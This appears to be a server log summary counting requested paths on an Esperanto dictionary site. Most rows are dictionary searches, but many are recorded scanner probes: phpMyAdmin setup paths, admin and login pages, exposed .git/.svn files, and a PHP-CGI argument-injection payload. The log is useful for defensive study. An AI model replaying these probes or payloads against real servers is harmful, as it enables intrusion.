Freq;Page
357;/apple-touch-icon-precomposed.png
246;/administrator/index.php
233;/cache/7c98c425e32af03fd6e78da12d7d49f4
224;/crossdomain.xml
192;/apple-touch-icon.png
140;/classes/){self.html(selector?jQuery(
115;/wp-login.php
71;/admin.php
53;/sitemap.xml
42;/ser%C4%89o/brava
42;/ser%C4%89o/gamo
41;/ser%C4%89o/vulgara
39;/undefined
38;/ser%C4%89o/planeo
36;/ser&
35;/ser%C4%89o/suferi
34;/ser%C4%89o
34;/ser%C4%89o/
32;/ser%C4%89o/-en-
30;/ser%C4%89o/forumo
30;/ser%C4%89o/kuko
30;/ser%C4%89o/perforti
28;/el%C5%9Duti/
28;/ser%C4%89o/Ne%C5%ADtono
28;/vortaro/
26;/check.htm?id=1b3cb64ad33846f19387b761ac056a7b
26;/wp-admin/
25;/ser%C4%89o/cirkvitkarto
18;//mc.yandex.ru/metrika/watch.js
18;//mc.yandex.ru/watch/1603051
18;/ser%C4%89o/kanzono
17;/administrator/
15;/ser%C4%89o/koncerni
14;/ser%C4%89o/femuro
13;/apple-touch-icon-114x114-precomposed.png
13;/apple-touch-icon-114x114.png
12;//wp-login.php
12;/blog//wp-login.php
12;/wordpress//wp-login.php
12;/wp//wp-login.php
11;/catalog/
11;/muieblackcat
11;/oscommerce/
11;/ser??o/brava
11;/shop
10;/?q=user
10;/admin/
10;/pri/3+%28%29
10;/ser
9;/netcat/admin/
8;/%7BHEADLINE%7D
8;//php-my-admin/index.php
8;/bitrix/admin/
8;/components/com_content/content.php
8;/forum/
8;/forum/viewtopic.php
8;/ser%C4%89o/imperativo
8;/ser%C4%89o/ne
8;/ser%C4%EF%BF%BDo/
7;/admin/content/sitetree/
7;/admin/index.php
7;/engine/engine.php
7;/ser%C3%84%E2%80%B0o
7;/ser%C4%89o/volitivo
7;/ser??o/gamo
6;//admin/pma/index.php
6;//admn/scripts/setup.php
6;//databaseadmin/scripts/setup.php
6;//db/scripts/setup.php
6;//dbadmin/scripts/setup.php
6;//myadmin/index.php
6;//mysql/scripts/setup.php
6;//phpMyAdmin-2.5.6/index.php
6;//phpMyAdmin-2.5.7/index.php
6;//phpMyAdmin-2.6.2-rc1/scripts/setup.php
6;//phpMyAdmin-2.6.3/scripts/setup.php
6;//phpmyadmin2/scripts/setup.php
6;//pma/scripts/setup.php
6;//web/index.php
6;//websql/scripts/setup.php
6;/bitrix/
6;/bitrix/js/main/core/core.css
6;/bitrix/themes/.default/adminstyles.css
6;/bitrix/themes/.default/images/auth_pict.gif
6;/configuration.php
6;/images/cms/admin/mac/common/butterfly.png
6;/media/system/js/mootools.js
6;/modules/system/system.base.css
6;/modules/system/system.css
6;/netcat/admin/skins/default/css/login.css
6;/netcat/admin/skins/default/css/style.css
6;/netcat/admin/skins/default/img/logo.png
6;/node/
6;/ser%C4%89o/je
6;/ser??o/vulgara
6;/serc.xo/perforti
6;/styles/skins/mac/design/css/style.css
6;/templates/system/css/system.css
6;/typo3/index.php
6;/user/login/
6;/user/password/
6;/users/forget/
6;/users/registrate/
6;/wp-admin/css/wp-admin.css
6;/wp-admin/images/wordpress-logo.png
6;/wp-content/
5;//admin/index.php
5;//admin/phpmyadmin/index.php
5;//db/index.php
5;//myadmin/scripts/setup.php
5;//mysql/index.php
5;//php-my-admin/scripts/setup.php
5;//phpadmin/index.php
5;//phpadmin/scripts/setup.php
5;//phpMyAdmin-2.5.1/index.php
5;//phpMyAdmin-2.5.5-rc2/index.php
5;//phpMyAdmin-2.5.6-rc1/index.php
5;//phpMyAdmin-2.5.7-pl1/index.php
5;//phpMyAdmin-2.8.1/scripts/setup.php
5;//phpMyAdmin-2.8.2/scripts/setup.php
5;//phpMyAdmin-2/scripts/setup.php
5;//phpmyadmin1/index.php
5;//phpmyadmin1/scripts/setup.php
5;//phpmyadmin2/index.php
5;//pma/index.php
5;//scripts/setup.php
5;//web/phpMyAdmin/index.php
5;//xampp/phpmyadmin/index.php
5;/?-s
5;/apanel/
5;/blocks/
5;/fpw.php
5;/gram/images/prepozicioj.png
5;/ipb/
5;/mc.yandex.ru/metrika/watch.js
5;/media.reformal.ru/widgets/v3/reformal.js
5;/ser%C4%89o/-n
5;/ser%C4%89o/kiel
5;/ser%C4%89o/pro
5;/ser?o/brava
5;/ser?o/gamo
5;/ser?o/vulgara
5;/templates/system/css/toolbar.css
5;/text/javascript
5;/vortaro.reformal.ru
5;/wp-content
5;/xmlrpc.php
4;/%5Bobject%20Object%5D://www.mytoolsapp.info/worker/init.js?b=2&l=0
4;//_admin/scripts/setup.php
4;//_phpmyadmin/scripts/setup.php
4;//admin/phpmyadmin/scripts/setup.php
4;//admin/pma/scripts/setup.php
4;//admin/scripts/setup.php
4;//admm/scripts/setup.php
4;//dbadmin/index.php
4;//mysql-admin/scripts/setup.php
4;//mysqlmanager/scripts/setup.php
4;//p/m/a/scripts/setup.php
4;//php-myadmin/scripts/setup.php
4;//phpmanager/scripts/setup.php
4;//phpmy-admin/scripts/setup.php
4;//phpmya/scripts/setup.php
4;//phpMyA/scripts/setup.php
4;//phpMyAdmin-2.2.3/index.php
4;//phpMyAdmin-2.2.3/scripts/setup.php
4;//phpMyAdmin-2.2.6/scripts/setup.php
4;//phpMyAdmin-2.5.1/scripts/setup.php
4;//phpMyAdmin-2.5.4/index.php
4;//phpMyAdmin-2.5.4/scripts/setup.php
4;//phpMyAdmin-2.5.5-pl1/scripts/setup.php
4;//phpMyAdmin-2.5.5-rc1/index.php
4;//phpMyAdmin-2.5.5-rc1/scripts/setup.php
4;//phpMyAdmin-2.5.5-rc2/scripts/setup.php
4;//phpMyAdmin-2.5.5/index.php
4;//phpMyAdmin-2.5.5/scripts/setup.php
4;//phpMyAdmin-2.5.6-rc1/scripts/setup.php
4;//phpMyAdmin-2.5.6-rc2/index.php
4;//phpMyAdmin-2.5.6-rc2/scripts/setup.php
4;//phpMyAdmin-2.5.6/scripts/setup.php
4;//phpMyAdmin-2.5.7-pl1/scripts/setup.php
4;//phpMyAdmin-2.5.7/scripts/setup.php
4;//phpMyAdmin-2.6.0-alpha/scripts/setup.php
4;//phpMyAdmin-2.6.0-alpha2/scripts/setup.php
4;//phpMyAdmin-2.6.0-beta1/scripts/setup.php
4;//phpMyAdmin-2.6.0-beta2/scripts/setup.php
4;//phpMyAdmin-2.6.0-pl1/scripts/setup.php
4;//phpMyAdmin-2.6.0-pl2/scripts/setup.php
4;//phpMyAdmin-2.6.0-pl3/scripts/setup.php
4;//phpMyAdmin-2.6.0-rc1/scripts/setup.php
4;//phpMyAdmin-2.6.0-rc2/scripts/setup.php
4;//phpMyAdmin-2.6.0-rc3/scripts/setup.php
4;//phpMyAdmin-2.6.0/scripts/setup.php
4;//phpMyAdmin-2.6.1-pl1/scripts/setup.php
4;//phpMyAdmin-2.6.1-pl2/scripts/setup.php
4;//phpMyAdmin-2.6.1-pl3/scripts/setup.php
4;//phpMyAdmin-2.6.1-rc1/scripts/setup.php
4;//phpMyAdmin-2.6.1-rc2/scripts/setup.php
4;//phpMyAdmin-2.6.1/scripts/setup.php
4;//phpMyAdmin-2.6.2-beta1/scripts/setup.php
4;//phpMyAdmin-2.6.2-pl1/scripts/setup.php
4;//phpMyAdmin-2.6.2/scripts/setup.php
4;//phpMyAdmin-2.6.3-pl1/scripts/setup.php
4;//phpMyAdmin-2.6.3-rc1/scripts/setup.php
4;//phpMyAdmin-2.6.4-pl1/scripts/setup.php
4;//phpMyAdmin-2.6.4-pl3/scripts/setup.php
4;//phpMyAdmin-2.6.4-pl4/scripts/setup.php
4;//phpMyAdmin-2.6.4-rc1/scripts/setup.php
4;//phpMyAdmin-2.6.4/scripts/setup.php
4;//phpMyAdmin-2.7.0-beta1/scripts/setup.php
4;//phpMyAdmin-2.7.0-pl1/scripts/setup.php
4;//phpMyAdmin-2.7.0-pl2/scripts/setup.php
4;//phpMyAdmin-2.7.0-rc1/scripts/setup.php
4;//phpMyAdmin-2.7.0/scripts/setup.php
4;//phpMyAdmin-2.8.0-beta1/scripts/setup.php
4;//phpMyAdmin-2.8.0-rc1/scripts/setup.php
4;//phpMyAdmin-2.8.0-rc2/scripts/setup.php
4;//phpMyAdmin-2.8.0.1/scripts/setup.php
4;//phpMyAdmin-2.8.0.2/scripts/setup.php
4;//phpMyAdmin-2.8.0.3/scripts/setup.php
4;//phpMyAdmin-2.8.0.4/scripts/setup.php
4;//phpMyAdmin-2.8.0/scripts/setup.php
4;//phpMyAdmin-2.8.1-rc1/scripts/setup.php
4;//phpMyAdmin-2/index.php
4;//pma2005/scripts/setup.php
4;//PMA2005/scripts/setup.php
4;//sqlmanager/scripts/setup.php
4;//sqlweb/scripts/setup.php
4;//typo3/phpmyadmin/index.php
4;//typo3/phpmyadmin/scripts/setup.php
4;//web/scripts/setup.php
4;//webadmin/scripts/setup.php
4;//webdb/scripts/setup.php
4;//websql/index.php
4;//xampp/phpmyadmin/scripts/setup.php
4;/?-n+-d+allow_url_include%3D1+-d+auto_prepend_file%3Dphp%3a%2f%2finput
4;/adm/
4;/administrator
4;/bitrix/admin/index.php
4;/controlpanel/
4;/cp/
4;/cpanel/
4;/engine/ajax/pm.php
4;/fckeditor/editor/images/anchor.gif
4;/forum/viewtopic.phpindex.php
4;/jsys.php
4;/ser%C3%84%E2%80%B0o/perforti
4;/ser%C4%89o/sana
4;/ser%C4%EF%BF%BDo/gamo
4;/ser??o/planeo
4;/ser?o/planeo
4;/serco/planeo
3;/%2BBoris
3;//_phpMyAdmin/scripts/setup.php
3;//Admin/scripts/setup.php
3;//phpAdmin/scripts/setup.php
3;//phpMyAdmin-2.11.1-all-languages/scripts/setup.php
3;//phpMyAdmin-2.11.1/scripts/setup.php
3;//phpMyAdmin-2.11.11-all-languages/scripts/setup.php
3;//phpMyAdmin-2.11.4/scripts/setup.php
3;//phpMyAdmin-2.11.9.4-all-languages/scripts/setup.php
3;//phpMyAdmin-2.2.6/index.php
3;//phpMyAdmin-2.5.5-pl1/index.php
3;//phpMyAdmin-2.6.4-pl2/scripts/setup.php
3;//phpMyAdmin-2.8.3/scripts/setup.php
3;//phpMyAdmin-2.9.1/scripts/setup.php
3;//pma2/scripts/setup.php
3;//pma3/scripts/setup.php
3;//sql/scripts/setup.php
3;//wp-phpmyadmin/phpmyadmin/scripts/setup.php
3;/?author=1
3;/++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++Result:+%F1%EA%F0%E8%EF%F2%EE%E7%E0%F9%E8%F2%E0+%E4%E5%F8%E8%F4%F0%EE%E2%E0%ED%E0;+%ED%E5+%ED%E0%F8%EB%EE%F1%FC+%F4%EE%F0%EC%FB+%E4%EB%FF+%EE%F2%EF%F0%E0%E2%EA%E8;
3;/blog/wp-login.php
3;/elsxuti/media.reformal.ru/widgets/v3/reformal.js
3;/FCKeditor/editor/images/anchor.gif
3;/gram/12/++++++++++++++++++++++++++++++++++++++++++++++++++++++++++Result:+%ED%E5+%ED%E0%F8%EB%EE%F1%FC+%F4%EE%F0%EC%FB+%E4%EB%FF+%EE%F2%EF%F0%E0%E2%EA%E8;
3;/gram/media.reformal.ru/widgets/v3/reformal.js
3;/info/media.reformal.ru/widgets/v3/reformal.js
3;/mc.yandex.ru/watch/1603051
3;/myadmin/
3;/pri/media.reformal.ru/widgets/v3/reformal.js
3;/ser%C4%EF%BF%BDo/-en-
3;/ser%C4%EF%BF%BDo/vulgara
3;/ser%D1%81xo/TEST
3;/sercho
3;/sercxo/media.reformal.ru/widgets/v3/reformal.js
3;/sercxo/stardict+mobi
3;/wp-includes/js/prototype.js
2;/&post=-38689454_25
2;//%0D/scripts/setup.php
2;//./scripts/setup.php
2;//_db/scripts/setup.php
2;//_dbadmin/scripts/setup.php
2;//_myphp/scripts/setup.php
2;//_php/scripts/setup.php
2;//_phpadmin/scripts/setup.php
2;//_pHpMyAdMiN/scripts/setup.php
2;//_PHPMYADMIN/scripts/setup.php
2;//_pma/scripts/setup.php
2;//_sql/scripts/setup.php
2;//~/phpmanager/scripts/setup.php
2;//3rdparty/phpMyAdmin/scripts/setup.php
2;//81/phpmyadmin/scripts/setup.php
2;//admin/myadmin/scripts/setup.php
2;//admin/mysql/scripts/setup.php
2;//Admin/phpmyadmin/scripts/setup.php
2;//Admin/phpMyAdmin/scripts/setup.php
2;//admin/phpMyAmdin/scripts/setup.php
2;//admin/sql/scripts/setup.php
2;//administrator/components/com_joommyadmin/phpmyadmin/scripts/setup.php
2;//adminmysql/scripts/setup.php
2;//apache-default/phpmyadmin/scripts/setup.php
2;//backup/phpmyadmin/scripts/setup.php
2;//backup/phpMyAdmin/scripts/setup.php
2;//bbs/data/scripts/setup.php
2;//bkup/phpmyadmin/scripts/setup.php
2;//bkup/phpMyAdmin/scripts/setup.php
2;//blog/phpmyadmin/scripts/setup.php
2;//cpadmin/scripts/setup.php
2;//cpadmindb/scripts/setup.php
2;//cpanelmysql/scripts/setup.php
2;//cpanelphpmyadmin/scripts/setup.php
2;//cpanelsql/scripts/setup.php
2;//cpdbadmin/scripts/setup.php
2;//cpphpmyadmin/scripts/setup.php
2;//database/scripts/setup.php
2;//dbAdmin2/scripts/setup.php
2;//forum/phpmyadmin/scripts/setup.php
2;//htdocs/scripts/setup.php
2;//httpdocs/scripts/setup.php
2;//myadmin/phpMyAdmin-2.11.9.6-all-languages/scripts/setup.php
2;//myAdmin/scripts/setup.php
2;//MyAdmin/scripts/setup.php
2;//mydatadmin/scripts/setup.php
2;//myphp/scripts/setup.php
2;//Myphp/scripts/setup.php
2;//mysql_administrator/scripts/setup.php
2;//MySQLAdmin/scripts/setup.php
2;//mysqladminconfig/scripts/setup.php
2;//padmin/scripts/setup.php
2;//php/phpmyadmin/scripts/setup.php
2;//php/scripts/setup.php
2;//phpas/scripts/setup.php
2;//phpdb/scripts/setup.php
2;//phpm/scripts/setup.php
2;//phpmy/scripts/setup.php
2;//pHpMy/scripts/setup.php
2;//phpmyad-sys/scripts/setup.php
2;//phpmyad/scripts/setup.php
2;//phpmyadm/scripts/setup.php
2;//phpMyAdmi/scripts/setup.php
2;//phpMyAdmin-2.10.0/scripts/setup.php
2;//phpMyAdmin-2.11.10/scripts/setup.php
2;//phpMyAdmin-2.11.2/scripts/setup.php
2;//phpMyAdmin-2.11.3-all-languages/scripts/setup.php
2;//phpMyAdmin-2.11.3/scripts/setup.php
2;//phpMyAdmin-2.11.4.0-all-languages/scripts/setup.php
2;//phpMyAdmin-2.11.4.0-english/scripts/setup.php
2;//phpMyAdmin-2.11.5.0-all-languages/scripts/setup.php
2;//phpMyAdmin-2.11.5.0-english/scripts/setup.php
2;//phpMyAdmin-2.11.5/scripts/setup.php
2;//phpMyAdmin-2.11.6.0-all-languages/scripts/setup.php
2;//phpMyAdmin-2.11.6.0-english/scripts/setup.php
2;//phpMyAdmin-2.11.6/scripts/setup.php
2;//phpMyAdmin-2.11.7.0-all-languages/scripts/setup.php
2;//phpMyAdmin-2.11.7.0-english/scripts/setup.php
2;//phpMyAdmin-2.11.7.1-all-languages/scripts/setup.php
2;//phpMyAdmin-2.11.7.1-english/scripts/setup.php
2;//phpMyAdmin-2.11.7/scripts/setup.php
2;//phpMyAdmin-2.11.8.0-all-languages/scripts/setup.php
2;//phpMyAdmin-2.11.8.0-english/scripts/setup.php
2;//phpMyAdmin-2.11.8.1-all-languages-utf-8-only/scripts/setup.php
2;//phpMyAdmin-2.11.8/scripts/setup.php
2;//phpMyAdmin-2.11.9.0-all-languages/scripts/setup.php
2;//phpMyAdmin-2.11.9.0-english/scripts/setup.php
2;//phpMyAdmin-2.11.9.1-all-languages/scripts/setup.php
2;//phpMyAdmin-2.11.9.1-english/scripts/setup.php
2;//phpMyAdmin-2.11.9.2-all-languages/scripts/setup.php
2;//phpMyAdmin-2.11.9.2-english/scripts/setup.php
2;//phpMyAdmin-2.11.9.3-all-languages/scripts/setup.php
2;//phpMyAdmin-2.11.9.3-english/scripts/setup.php
2;//phpMyAdmin-2.11.9.4-english/scripts/setup.php
2;//phpMyAdmin-2.11.9.5-all-languages/scripts/setup.php
2;//phpMyAdmin-2.11.9/scripts/setup.php
2;//phpMyAdmin-2.3.0/scripts/setup.php
2;//phpMyAdmin-2.3.1/scripts/setup.php
2;//phpMyAdmin-2.3.2/scripts/setup.php
2;//phpMyAdmin-2.3.3/scripts/setup.php
2;//phpMyAdmin-2.3.4/scripts/setup.php
2;//phpMyAdmin-2.3.5/scripts/setup.php
2;//phpMyAdmin-2.3.6/scripts/setup.php
2;//phpMyAdmin-2.3.7/scripts/setup.php
2;//phpMyAdmin-2.3.8/scripts/setup.php
2;//phpMyAdmin-2.3.9/scripts/setup.php
2;//phpMyAdmin-2.4.0/scripts/setup.php
2;//phpMyAdmin-2.4.1/scripts/setup.php
2;//phpMyAdmin-2.4.2/scripts/setup.php
2;//phpMyAdmin-2.4.3/scripts/setup.php
2;//phpMyAdmin-2.4.4/scripts/setup.php
2;//phpMyAdmin-2.4.5/scripts/setup.php
2;//phpMyAdmin-2.4.6/scripts/setup.php
2;//phpMyAdmin-2.4.7/scripts/setup.php
2;//phpMyAdmin-2.4.8/scripts/setup.php
2;//phpMyAdmin-2.4.9/scripts/setup.php
2;//phpMyAdmin-2.5.0/scripts/setup.php
2;//phpMyAdmin-2.5.2/scripts/setup.php
2;//phpMyAdmin-2.5.3/scripts/setup.php
2;//phpMyAdmin-2.5.5-rc1config/scripts/setup.php
2;//phpMyAdmin-2.5.8/scripts/setup.php
2;//phpMyAdmin-2.5.9/scripts/setup.php
2;//phpMyAdmin-2.6.3/
2;//phpMyAdmin-2.6.5/scripts/setup.php
2;//phpMyAdmin-2.6.6/scripts/setup.php
2;//phpMyAdmin-2.6.7/scripts/setup.php
2;//phpMyAdmin-2.6.8/scripts/setup.php
2;//phpMyAdmin-2.6.9/scripts/setup.php
2;//phpMyAdmin-2.7.1/scripts/setup.php
2;//phpMyAdmin-2.7.2/scripts/setup.php
2;//phpMyAdmin-2.7.3/scripts/setup.php
2;//phpMyAdmin-2.7.4/scripts/setup.php
2;//phpMyAdmin-2.7.5/scripts/setup.php
2;//phpMyAdmin-2.7.6/scripts/setup.php
2;//phpMyAdmin-2.7.7/scripts/setup.php
2;//phpMyAdmin-2.7.8/scripts/setup.php
2;//phpMyAdmin-2.7.9/scripts/setup.php
2;//phpMyAdmin-2.8.4/scripts/setup.php
2;//phpMyAdmin-2.8.5/scripts/setup.php
2;//phpMyAdmin-2.8.6/scripts/setup.php
2;//phpMyAdmin-2.8.7/scripts/setup.php
2;//phpMyAdmin-2.8.8/scripts/setup.php
2;//phpMyAdmin-2.8.9/scripts/setup.php
2;//phpMyAdmin-2.9.2/scripts/setup.php
2;//phpMyAdmin-3.0.0-rc1-english/scripts/setup.php
2;//phpMyAdmin-3.0.0.0-all-languages/scripts/setup.php
2;//phpMyAdmin-3.0.0.0-english/scripts/setup.php
2;//phpMyAdmin-3.0.1.0-all-languages/scripts/setup.php
2;//phpMyAdmin-3.0.1.0-english/scripts/setup.php
2;//phpMyAdmin-3.1.0.0-all-languages/scripts/setup.php
2;//phpMyAdmin-3.1.0.0-english/scripts/setup.php
2;//phpMyAdmin-3.1.1.0-all-languages/scripts/setup.php
2;//phpMyAdmin-3.1.1.0-english/scripts/setup.php
2;//phpMyAdmin-3.1.2.0-all-languages/scripts/setup.php
2;//phpMyAdmin-3.1.2.0-english/scripts/setup.php
2;//phpMyAdmin-3.1.3.0-all-languages/scripts/setup.php
2;//phpMyAdmin-3.1.3.0-english/scripts/setup.php
2;//phpMyAdmin-3/scripts/setup.php
2;//phpMyAdmin-4/scripts/setup.php
2;//phpmyadmin.old/scripts/setup.php
2;//pHpMyAdMiN/scripts/setup.php
2;//PHPMYADMIN/scripts/setup.php
2;//phpMyAdmin1/scripts/setup.php
2;//phpMyAdmin2/scripts/setup.php
2;//phpmyadmin3/scripts/setup.php
2;//phpMyAdmin3/scripts/setup.php
2;//phpMyAds/scripts/setup.php
2;//pma/%20/scripts/setup.php
2;//pMA/scripts/setup.php
2;//PMA/scripts/setup.php
2;//pma_mydb/scripts/setup.php
2;//PMA2/scripts/setup.php
2;//pma2009/scripts/setup.php
2;//PMA2009/scripts/setup.php
2;//PMA3/scripts/setup.php
2;//pmadmin/scripts/setup.php
2;//roundcube/scripts/setup.php
2;//sl2/data/scripts/setup.php
2;//sql/phpmyadmin/scripts/setup.php
2;//sql/phpMyAdmin/scripts/setup.php
2;//SQL/scripts/setup.php
2;//sqladm.old/scripts/setup.php
2;//sqladmin/scripts/setup.php
2;//SSLMySQLAdmin/scripts/setup.php
2;//vhcs2/tools/pma/scripts/setup.php
2;//web/phpmyadmin/scripts/setup.php
2;//web/phpMyAdmin/scripts/setup.php
2;//webmail2/scripts/setup.php
2;//wp-content/plugins/wp-phpmyadmin/wp-phpmyadmin/phpmyadmin/scripts/setup.php
2;//wp-phpmyadmin/scripts/setup.php
2;/?action=add
2;/?e=phpinfo();
2;/?q=admin
2;/1.2.6
2;/404javascript.js
2;/404testpage4525d2fdc
2;/about
2;/about.php
2;/admin/fckeditor/editor/images/anchor.gif
2;/admin/FCKeditor/editor/images/anchor.gif
2;/admin/login.php
2;/apple-touch-icon-72x72-precomposed.png
2;/apple-touch-icon-72x72.png
2;/application/x-www-form-urlencoded
2;/bots.all
2;/contact
2;/contacts
2;/elsxuti/text/javascript
2;/el≈ùuti/
2;/gram/index.php
2;/help.html
2;/images/aleks.jpg
2;/images/boris.jpg
2;/images/igor.jpg
2;/info/mailto:alex.osokin@gmail.com?subject=Letero%20de%20la%20vortara%20pagxaro%20por%20Aleks
2;/info/mailto:vortaristo@gmail.com?subject=Letero%20de%20la%20vortara%20pagxaro%20por%20la%20auxtoro
2;/info/mailto:yegor.chemisov@gmail.com?subject=ervo
2;/info/text/javascript
2;/info/vortaro.reformal.ru
2;/iwantgetyouremail
2;/jsys.phpindex.php
2;/labels.rdf
2;/mailto:alex.osokin@gmail.com?subject=Letero%20de%20la%20vortara%20pagxaro%20por%20Aleks
2;/mailto:vortaristo@gmail.com?subject=Letero%20de%20la%20vortara%20pagxaro%20por%20la%20auxtoro
2;/mailto:yegor.chemisov@gmail.com?subject=ervo
2;/Microsoft.XMLHTTP
2;/mod/pages/tpl/pages_add.html
2;/plugins/editors/tinymce/jscripts/tiny_mce/plugins/tinybrowser/tinybrowser.php?type=file&folder=
2;/pri/5.01
2;/pri/text/javascript
2;/pri/vortaro.reformal.ru
2;/search
2;/ser%09o/-en-
2;/ser%C4%89o/posedi
2;/ser%C4%EF%BF%BDo/brava
2;/ser%C4%EF%BF%BDo/forumo
2;/ser?o/
2;/ser?o/-en-
2;/ser?o/femuro
2;/ser?o/forumo
2;/ser?o/koncerni
2;/ser?o/kuko
2;/ser?tono
2;/serco/cirkvitkarto
2;/serco/cirkvittabulo
2;/serco/gamo
2;/sercxo/%D0%9A%D0%BE%D1%80%D1%80%D0%B5%D1%81%D0%BF%D0%BE%D0%BD%D0%B4%D0%B5%D0%BD%D1%82%20%28%D0%B6%D1%83%D1%80%D0%BD%D0%B0%D0%BB%29
2;/sercxo/%D1%87%D0%B5%D1%80%D0%BD%D0%B0%D1%8F+%D1%81%D0%BC%D0%BE%D1%80%D0%BE%D0%B4%D0%B8%D0%BD%D0%B0
2;/sercxo/+%D0%B2%D0%B2%D0%B8%D0%B4%D1%83
2;/sercxo/Asus+Lamborghini+Eee+PC+VX6S+ubuntu+install
2;/sercxo/goldendict+command-line+version
2;/sercxo/mu%3Fi
2;/sercxo/pomocna+r%C4%99ka
2;/sercxo/text/javascript
2;/submit.autocomplete
2;/user/register
2;/wp-admin.php
1;/-
1;/%D0%B2%D1%81%D0%B5-%D1%82%D0%B0%D0%BA%D0%B8
1;/%D1%81%D0%BF%D0%BE%D1%80%D0%B8%D1%82%D1%8C
1;/.git/config
1;/.svn/entries
1;///mc.yandex.ru/metrika/watch.js
1;//_myadmin/scripts/setup.php
1;//2010/phpMyAdmin/scripts/setup.php
1;//2011/phpMyAdmin/scripts/setup.php
1;//admin/fckeditor/editor//plugins/ajaxfilemanager/jscripts/edit_area/edit_area.css
1;//admin/includes/stylesheet.css
1;//admin/main.php
1;//admin/my/scripts/setup.php
1;//admin/mysqladmin/scripts/setup.php
1;//admin/pmadm/scripts/setup.php
1;//admin/tiny_mce//plugins/ajaxfilemanager/jscripts/edit_area/edit_area.css
1;//ajaxfilemanager/jscripts/tiny_mce//plugins/ajaxfilemanager/jscripts/edit_area/edit_area.css
1;//b2b/admin/includes/stylesheet.css
1;//backup/scripts/setup.php
1;//cart/admin/includes/stylesheet.css
1;//cbadmin/scripts/setup.php
1;//cbadmin2/scripts/setup.php
1;//db1/scripts/setup.php
1;//dbadmin/
1;//dbadmin/main.php
1;//dbAdmin/scripts/setup.php
1;//dbg/scripts/setup.php
1;//eshop/admin/includes/stylesheet.css
1;//faq/admin/editor//plugins/ajaxfilemanager/jscripts/edit_area/edit_area.css
1;//fckeditor/editor//plugins/ajaxfilemanager/jscripts/edit_area/edit_area.css
1;//FCKeditor/editor//plugins/ajaxfilemanager/jscripts/edit_area/edit_area.css
1;//forum/includes/xml/bitfield_vbseo.xml
1;//gallery/zp-core/zp-extensions/tiny_mce//plugins/ajaxfilemanager/jscripts/edit_area/edit_area.css
1;//includes/fckeditor/editor//plugins/ajaxfilemanager/jscripts/edit_area/edit_area.css
1;//includes/tinymce//plugins/ajaxfilemanager/jscripts/edit_area/edit_area.css
1;//includes/xml/bitfield_vbseo.xml
1;//javascript/tinymce/jscripts/tiny_mce//plugins/ajaxfilemanager/jscripts/edit_area/edit_area.css
1;//js/jscripts/tiny_mce//plugins/ajaxfilemanager/jscripts/edit_area/edit_area.css
1;//js/tiny_mce//plugins/ajaxfilemanager/jscripts/edit_area/edit_area.css
1;//jscripts/tiny_mce//plugins/ajaxfilemanager/jscripts/edit_area/edit_area.css
1;//libs/scripts/setup.php
1;//main/inc/lib/fckeditor/editor//plugins/ajaxfilemanager/jscripts/edit_area/edit_area.css
1;//my-php/scripts/setup.php
1;//My-php/scripts/setup.php
1;//my/scripts/setup.php
1;//myad/scripts/setup.php
1;//myadmin/
1;//myadmin/main.php
1;//myadmin/MyAdmin/scripts/setup.php
1;//mydb/scripts/setup.php
1;//mysql-admin/
1;//mysql/
1;//mysql//scripts/setup.php
1;//mysql/main.php
1;//mysql2/scripts/setup.php
1;//mysqlmanager/
1;//p/m/a/
1;//p/m/a/index.php
1;//pa/scripts/setup.php
1;//phadmin/scripts/setup.php
1;//photo/zp-core/zp-extensions/tiny_mce//plugins/ajaxfilemanager/jscripts/edit_area/edit_area.css
1;//php-my-admin/
1;//php-myadmin/
1;//php/main.php
1;//php1/scripts/setup.php
1;//phpad/scripts/setup.php
1;//phpma/scripts/setup.php
1;//phpMA/scripts/setup.php
1;//phpmanager/
1;//phpmy-admin/
1;//phpmy/my/scripts/setup.php
1;//phpMyAdmin-1/scripts/setup.php
1;//phpMyAdmin-2.10.0.2-english/scripts/setup.php
1;//phpMyAdmin-2.10.0.2/scripts/setup.php
1;//phpMyAdmin-2.10.3/scripts/setup.php
1;//phpMyAdmin-2.11.1.2-all-languages/scripts/setup.php
1;//phpMyAdmin-2.11.10.1/scripts/setup.php
1;//phpMyAdmin-2.11.11.1-english/scripts/setup.php
1;//phpMyAdmin-2.11.11.3/scripts/setup.php
1;//phpMyAdmin-2.11.2.2/scripts/setup.php
1;//phpMyAdmin-2.11.4-all-languages-utf-8-only/scripts/setup.php
1;//phpMyAdmin-2.11.5-english/scripts/setup.php
1;//phpMyAdmin-2.11.5.1-all-languages/scripts/setup.php
1;//phpMyAdmin-2.11.6-all-languages/scripts/setup.php
1;//phpMyAdmin-2.11.9.3/scripts/setup.php
1;//phpMyAdmin-2.11.9.5/scripts/setup.php
1;//phpMyAdmin-2.11.9.6/scripts/setup.php
1;//phpMyAdmin-2.2.3/
1;//phpMyAdmin-2.2.6/
1;//phpMyAdmin-2.5.1/
1;//phpMyAdmin-2.5.4/
1;//phpMyAdmin-2.5.5-rc1/
1;//phpMyAdmin-2.5.5-rc2/
1;//phpMyAdmin-2.5.5/
1;//phpMyAdmin-2.5.6-rc2/
1;//phpMyAdmin-2.5.7-pl1/
1;//phpMyAdmin-2.5.7/
1;//phpMyAdmin-2.6.0-alpha/
1;//phpMyAdmin-2.6.0-alpha2/
1;//phpMyAdmin-2.6.0-beta1/
1;//phpMyAdmin-2.6.0-beta2/
1;//phpMyAdmin-2.6.0-pl1/
1;//phpMyAdmin-2.6.0-pl2/
1;//phpMyAdmin-2.6.0-pl3/
1;//phpMyAdmin-2.6.0-rc1/
1;//phpMyAdmin-2.6.0-rc2/
1;//phpMyAdmin-2.6.0-rc3/
1;//phpMyAdmin-2.6.0/
1;//phpMyAdmin-2.6.1-pl2/
1;//phpMyAdmin-2.6.1-rc1/
1;//phpMyAdmin-2.6.1-rc2/
1;//phpMyAdmin-2.6.1/
1;//phpMyAdmin-2.6.2-beta1/
1;//phpMyAdmin-2.6.2-pl1/
1;//phpMyAdmin-2.6.2/
1;//phpMyAdmin-2.6.3-pl1/
1;//phpMyAdmin-2.6.3-rc1/
1;//phpMyAdmin-2.6.4-pl1/
1;//phpMyAdmin-2.6.4-pl2/
1;//phpMyAdmin-2.6.4-pl3/
1;//phpMyAdmin-2.6.4-pl4/
1;//phpMyAdmin-2.6.4-rc1/
1;//phpMyAdmin-2.6.4/
1;//phpMyAdmin-2.7.0-beta1/
1;//phpMyAdmin-2.7.0-pl1/
1;//phpMyAdmin-2.7.0-pl2/
1;//phpMyAdmin-2.7.0-rc1/
1;//phpMyAdmin-2.8.0-beta1/
1;//phpMyAdmin-2.8.0.2/
1;//phpMyAdmin-2.8.0.3/
1;//phpMyAdmin-2.8.0.4/
